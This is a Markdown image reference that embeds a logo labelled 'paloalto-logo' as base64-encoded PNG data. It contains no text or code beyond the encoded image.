[paloalto-logo]: data:image/png;base64,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
